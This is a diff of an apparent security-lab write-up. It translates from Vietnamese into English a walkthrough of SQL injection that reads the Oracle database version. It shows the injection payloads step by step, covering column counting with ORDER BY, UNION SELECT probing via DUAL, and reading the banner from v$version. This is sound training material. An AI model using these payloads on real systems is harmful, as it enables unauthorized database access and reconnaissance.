@@ -39,25 +39,26 @@ The final query becomes:
 SELECT * FROM users WHERE username = 'administrator';
 ```
 
-# SQL injection attack, querying the database type and version on Oracle
+# SQL Injection Attack: Querying the Database Type and Version on Oracle
 ## Lab Description
 ![image](Picture/lab3.png)
 
-Trong `Oracle`, mọi câu lệnh SELECT đều phải có một bảng `FROM`. Và trong `Oracle` có một table có thể được dùng cho mục đích này tên là `dual`
-Và có 2 phương pháp khác nhau để truy vấn phiên bản cơ sở dữ liệu trên Oracle.
-`SELECT banner FROM v$version`, `SELECT version FROM v$instance`
+In `Oracle`, every `SELECT` statement must specify a table to select `FROM`. There is a table in Oracle that can be used for this purpose called `dual`. 
 
-Để làm được bài tìm được columns chứa string. 
-Các bước thực hiện của bài này:
-- Đầu tiên xác định số columns của nó bằng cách inject `' ORDER BY 1--` ở đây 1 là số columns, ta tiếp tục tăng lên đến khi bị lỗi và xác định được là có 2 columns.
+There are two different methods to query the database version on Oracle:
+`SELECT banner FROM v$version`, `SELECT version FROM v$instance`.
+
+To solve the lab, find the columns containing strings. 
+Steps:
+- First, determine the number of columns by injecting `' ORDER BY 1--`. Here, 1 is the number of columns. Continue increasing until an error occurs, and the result indicates that there are 2 columns.
   ```sql
   SELECT * FROM someTable WHERE category = 'Pets' ORDER BY 2--
   ```
-- Tiếp tục kiểm tra cột chứa string bằng `' UNION SELECT 'a','a' FROM DUAL--` ta xác định được 2 columns đều chứa string.
+- Next, check which columns contain strings by injecting `' UNION SELECT 'a','a' FROM DUAL--`. both being string columns.
   ```sql
   SELECT * FROM someTable WHERE category = 'Pets' UNION SELECT 'a','a' FROM DUAL--
   ```
-- Và cuối cùng để lấy thông tin version inject `' UNION SELECT 'a', banner FROM v$version--`
+- Finally, to obtain the version information, inject `' UNION SELECT 'a', banner FROM v$version--`.
   ```sql
   SELECT * FROM someTable WHERE category='Pets' UNION SELECT 'a', banner FROM v$version--'
   ```
